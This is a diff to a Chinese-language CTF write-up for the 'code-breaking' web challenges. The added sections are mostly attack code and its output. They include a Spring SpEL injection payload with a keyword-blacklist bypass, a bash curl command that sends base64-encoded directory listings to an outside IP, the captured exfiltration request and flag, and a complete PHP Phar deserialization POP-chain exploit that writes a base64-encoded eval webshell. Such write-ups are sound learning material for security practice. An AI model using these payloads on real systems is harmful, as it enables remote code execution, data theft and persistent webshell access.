@@ -1,8 +1,9 @@
 ---
 title: code-breaking
+password: codebreaking
+abbrlink: 16617
 date: 2018-11-25 12:03:18
 tags:
-password: codebreaking
 ---
 
 # function
@@ -213,6 +214,8 @@ Host: php
 domain=xxx&log=://filter/convert.base64-decode/resource=/var/www/html/data/d048eec664d8a61e7cdf1469ea8d1f31/aaad.php/.
 ```
 
+这里，写文件后缀使用.php%0a也可以。
+
 方法一：为了好控制base64_decode的内容，把内容写到了cname中，
 
 参考如下:https://www.cnblogs.com/iamstudy/articles/code_breaking_writeup.html#_label2
@@ -375,7 +378,7 @@ if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
 
 `code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));`
 
-`eval(session_id(session_start()));`
+`eval(hex2bin(session_id(session_start())));`
 
 另外在php 7.1下，`getenv()`函数新增了无参数时会获取服务段的env数据，这个时候也可以利用
 
@@ -533,5 +536,272 @@ ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$ echo eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZ
 
 # javacon
 
+```
+private String getAdvanceValue(String val) {
+/*  92 */     for (String keyword : this.keyworkProperties.getBlacklist()) {
+/*  93 */       Matcher matcher = Pattern.compile(keyword, 34).matcher(val);
+/*  94 */       if (matcher.find()) {
+/*  95 */         throw new HttpClientErrorException(HttpStatus.FORBIDDEN);
+/*     */       }
+/*     */     }
+/*     */     
+/*  99 */     Object parserContext = new TemplateParserContext();
+/* 100 */     Expression exp = this.parser.parseExpression(val, (ParserContext)parserContext);
+/* 101 */     SmallEvaluationContext evaluationContext = new SmallEvaluationContext();
+/* 102 */     return exp.getValue(evaluationContext).toString();
+/*     */   }
+```
 
+这里的val就是username, 如果设置了remember-me，就会把username保存到cookie中。
+
+payload:
+
+```
+基础payload: 
+String cmd2 = "#{T(String).getClass()." +
+                "forName(\"java.lang.Runtime\").getMethod(\"exec\",T(String[]))." +
+                "invoke(T(String).getClass().forName(\"java.lang.Runtime\")." +
+                "getMethod(\"getRuntime\").invoke(T(String).getClass()." +
+                "forName(\"java.lang.Runtime\"))," +
+                "new String[]{\"calc\"})}";
+绕过过滤: java.+lang, Runtime, exec.*\(
+
+String cmd1 = "#{T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"calc\"})}";
+```
+
+运行:
+
+```
+System.out.println(Encryptor.encrypt("c0dehack1nghere1",
+                    "0123456789abcdef", "#{T(String).getClass()." +           "forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[]))." +
+"invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")." +
+"getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass()." +
+                            "forName(\"java.l\"+\"ang.Ru\"+\"ntime\"))," +
+                            "new String[]{\"/bin/bash\",\"-c\",\"curl 39.106.97.201/`cd / && ls|base64|tr '\\n' '-'`\"})}"));
+```
+
+得到:
+
+```
+Q6HHCvBrK9SWCzRQXC6jqYX_XeqyZuDreUixnpXpzlN9ATMq650tXCEsY3IgEjPBfiqHXSaVVERM49Uk2U7Ck9jAen0rtXnQIWeubOEciPSPvSwF8RjI2WkEraNAXZIujCvLeXUQyGBFmTyInkWz_MV
+```
+
+得到文件名:
+
+```
+GET /YmluCmJvb3QKY2hhbGxlbmdlLTAuMC4xLVNOQVBTSE9ULmphcgpkZXYKZG9ja2VyLWphdmEtaG9t-ZQpldGMKZmxhZ19qNHY0X2NodW4KaG9tZQpsaWIKbWVkaWEKbW50Cm9wdApwcm9jCnJvb3QKcnVu-CnNiaW4Kc3J2CnN5cwp0bXAKdXNyCnZhcgo=- HTTP/1.1
+Host: 39.106.97.201
+User-Agent: curl/7.52.1
+Accept: */*
+
+解码:
+ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$ echo YmluCmJvb3QKY2hhbGxlbmdlLTAuMC4xLVNOQVBTSE9ULmphcgpkZXYKZG9ja2VyLWphdmEtaG9tZQpldGMKZmxhZ19qNHY0X2NodW4KaG9tZQpsaWIKbWVkaWEKbW50Cm9wdApwcm9jCnJvb3QKcnVuCnNiaW4Kc3J2CnN5cwp0bXAKdXNyCnZhcgo= | base64 -d
+bin
+boot
+challenge-0.0.1-SNAPSHOT.jar
+dev
+docker-java-home
+etc
+flag_j4v4_chun
+```
+
+getflag:
+
+`flag{ea915bcdda16c93cd180147bb5fbbe67}`
+
+p师傅本意:
+
+```
+#{T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("code..."),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())}
+```
+
+![](/assets/java_secure/FlbrchEql40MmGLz9ECw8fsxxSAA.jfif)
+
+**Java 1.8后Nashorn取代Rhino(JDK 1.6, JDK1.7)成为Java的嵌入式JavaScript引擎，相比于Python需要安装第三方库，Java可以更容易地在Java里执行JavaScript代码。  我们可以在命令行里使用jjs来测试这个JavaScript解释器。 ----- phith0n**
+
+# lumenserial
+
+漏洞比较明显，重要的是找POP链。太菜，复现为主。
+
+```
+private function download($url)
+    {
+        $maxSize = $this->config['catcherMaxSize'];
+        $limitExtension = array_map(function ($ext) {
+            return ltrim($ext, '.');
+        }, $this->config['catcherAllowFiles']);
+        $allowTypes = array_map(function ($ext) {
+            return "image/{$ext}";
+        }, $limitExtension);
+
+        $content = file_get_contents($url);
+        $img = getimagesizefromstring($content);
+
+        if ($img && in_array($img['mime'], $allowTypes)) {
+            $guesser = ExtensionGuesser::getInstance();
+            $ext = $guesser->guess($img['mime']);
+            $size = strlen($content);
+
+            $html_path = app()->basePath('html');
+            $upload_path = $this->fullPath($this->config['catcherPathFormat']);
+
+            if (in_array($ext, $limitExtension) && $size <= $maxSize) {
+                if (!is_dir("{$html_path}{$upload_path}")) {
+                    mkdir("{$html_path}{$upload_path}", 0777, true);
+                }
+
+                $filename = \bin2hex(\random_bytes(10)) . '.' . $ext;
+                file_put_contents("{$html_path}{$upload_path}/{$filename}", $content);
+
+                return [
+                    "url" => "{$upload_path}/{$filename}",
+                    "source" => $url,
+                    "state" => "SUCCESS"
+                ];
+            } else {
+                throw new FileException("file extension .{$ext} or size {$size} error");
+            }
+
+        } else {
+            throw new FileException('Only support catching image file');
+        }
+    }
+```
+
+download函数使用了`file_get_contents`,可以结合`Phar`构造反序列化。
+
+gadget1:
+
+```
+namespace Illuminate\Broadcasting {
+    class PendingBroadcast
+    {
+        public function __construct(Dispatcher $events, $event)
+        {
+            $this->event = $event;
+            $this->events = $events;
+        }
+        
+        public function __destruct()
+        {
+            $this->events->dispatch($this->event);
+        }
+    }
+}
+```
+
+通过传递`$this->event`执行其他类的`__call`方法。
+
+gadget2:
+
+```
+namespace Faker{
+    class ValidGenerator{
+    	public function __construct(Generator $generator, $validator = null, $maxRetries = 10000)
+        {
+            $this->generator = $generator;
+            $this->validator = $validator;
+            $this->maxRetries = $maxRetries;
+        }
+    
+        public function __call($name, $arguments){
+            $i = 0;
+            do {
+                $res = call_user_func_array(array($this->generator, $name), $arguments);
+                $i++;
+                if ($i > $this->maxRetries) {
+                    die('error');
+                }
+            } while (!call_user_func($this->validator, $res));
+
+            return $res;
+        }
+    }
+}
+```
+
+gadget3:
+
+gadget4:
+
+gadget5:
+
+exploit:
+
+```
+<?php
+namespace Illuminate\Broadcasting{
+    class PendingBroadcast{
+        protected $events;
+        protected $event;
+        public function __construct($events, $event)
+        {
+            $this->event = $event;
+            $this->events = $events;
+        }
+    }
+}
+
+namespace Faker{
+    class Generator{
+        protected $formatters;
+        function __construct($forma){
+            $this->formatters = $forma;
+        }
+    }
+    class ValidGenerator{
+        protected $generator;
+        protected $validator;
+        protected $maxRetries;
+
+        public function __construct($generator, $validator, $maxRetries = 10000){
+            $this->generator = $generator;
+            $this->validator = $validator;
+            $this->maxRetries = $maxRetries;
+        }
+    }
+}
+
+namespace PHPUnit\Framework\MockObject\Invocation{
+    class StaticInvocation{
+        function __construct($parameters){
+            $this->parameters = $parameters;
+        }
+    }
+}
+
+namespace PHPUnit\Framework\MockObject\Stub{
+    class ReturnCallback{
+        public function __construct($callback){
+            $this->callback = $callback;
+        }
+    }   
+}
+
+# exp func call
+namespace{
+    $exp_func = "file_put_contents";
+    $exp_args = ["C:\\phpstudy2018\\PHPTutorial\\WWW\\ctf\\pwnhub\\lumenserial\\bbbb.php", base64_decode("PD9waHAgZXZhbCgkX0dFVFsnMTEnXSk7Pz4=")];
+    $exp_args_obj = new PHPUnit\Framework\MockObject\Invocation\StaticInvocation($exp_args);
+    $exp_call_obj = new PHPUnit\Framework\MockObject\Stub\ReturnCallback($exp_func);
+
+    $tmp_arr = ["gogogo" => $exp_args_obj];
+    $s4_obj = new Faker\Generator($tmp_arr);
+
+    $get_func_arr = array("dispatch"=> array($s4_obj, "getFormatter"));
+    $s3_obj = new Faker\Generator($get_func_arr);
+
+    $s2_obj = new Faker\ValidGenerator($s3_obj, array($exp_call_obj,"invoke"), 2);
+
+    $s1_obj = new Illuminate\Broadcasting\PendingBroadcast($s2_obj, "gogogo");
+    echo urlencode(serialize($s1_obj))."\n\r\n\r";
+    
+    $p = new Phar('./exploit.phar', 0);
+    $p->startBuffering();
+    $p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
+    $p->setMetadata($s1_obj);
+    $p->addFromString('1.txt','text');
+    $p->stopBuffering();
+}
+```
 
